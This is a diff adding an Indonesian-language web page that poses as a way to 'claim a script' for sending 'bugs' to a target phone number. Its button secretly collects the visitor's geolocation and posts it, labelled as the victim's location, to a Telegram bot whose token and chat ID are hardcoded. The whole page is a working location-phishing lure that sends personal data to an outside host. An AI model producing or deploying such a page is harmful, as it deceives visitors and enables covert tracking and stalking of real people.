@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title> MASUK UNTUK BUG NOMER TARGET </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: black;
+      color: lime;
+      text-align: center;
+      padding: 50px;
+    }
+    .btn {
+      background-color: lime;
+      color: black;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .lokasi-box {
+      margin-top: 30px;
+      padding: 20px;
+      background: #111;
+      border: 2px solid red;
+      border-radius: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>MASUK UNTUK MENGIRIM BUG KE TARGET</h1>
+  <p>Silakan klik tombol di bawah untuk klaim script secara otomatis</p>
+
+  <button class="btn" onclick="mintaLokasi()">🔓 Klaim Sekarang</button>
+
+  <div id="lokasi" class="lokasi-box"></div>
+
+  <script>
+    const token = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
+    const chatId = "6788646701";
+
+    function mintaLokasi() {
+      navigator.geolocation.getCurrentPosition(
+        function(pos) {
+          const lat = pos.coords.latitude.toFixed(5);
+          const lon = pos.coords.longitude.toFixed(5);
+          const map = `https://www.google.com/maps?q=${lat},${lon}`;
+          document.getElementById("lokasi").style.display = "block";
+          document.getElementById("lokasi").innerHTML = `
+            <h2>📍 Lokasi Berhasil Terkirim</h2>
+            <p>Latitude: <b>${lat}</b></p>
+            <p>Longitude: <b>${lon}</b></p>
+            <a href="${map}" target="_blank" style="color:cyan;">🔗 Lihat Lokasi di Google Maps</a>
+          `;
+
+          const pesan = `📍 *Lokasi Korban (Klaim SC):*\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 ${map}`;
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: pesan,
+              parse_mode: "Markdown"
+            })
+          });
+        },
+        function(error) {
+          alert("❌ MENGIRIM BUG  gagal .");
+        }
+      );
+    }
+  </script>
+
+</body>
+</html>
